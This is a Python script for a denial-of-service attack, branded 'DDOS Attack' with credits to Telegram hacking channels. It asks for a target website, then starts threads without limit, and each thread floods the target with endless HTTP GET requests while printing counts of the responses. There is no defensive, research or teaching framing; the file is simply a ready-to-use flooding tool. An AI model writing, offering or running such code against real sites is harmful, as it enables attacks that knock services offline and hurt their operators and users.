import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os

#//Gui Start//#
 

headers = {
  "User-Agent": "Flyier DoS"
}

osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''

 ____  ____   ___  ____       _   _   _             _
|  _ \|  _ \ / _ \/ ___|     / \ | |_| |_ __ _  ___| | __
| | | | | | | | | \___ \    / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | |_| |___) |  / ___ \ |_| || (_| | (__|   <
|____/|____/ \___/|____/  /_/   \_\__|\__\__,_|\___|_|\_\

  CREDITS =  t.me/TeamD_404     

 OUR CHANNEL LINK = t.me/TeamD_Hacking_404
 '''




banner = r"""
v1 """.replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
#//Gui End//#
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
url = input("Enter Website Ip Address-> ")
print()
time.sleep(1)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url

  print(url)
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
 
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
        else:
          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass
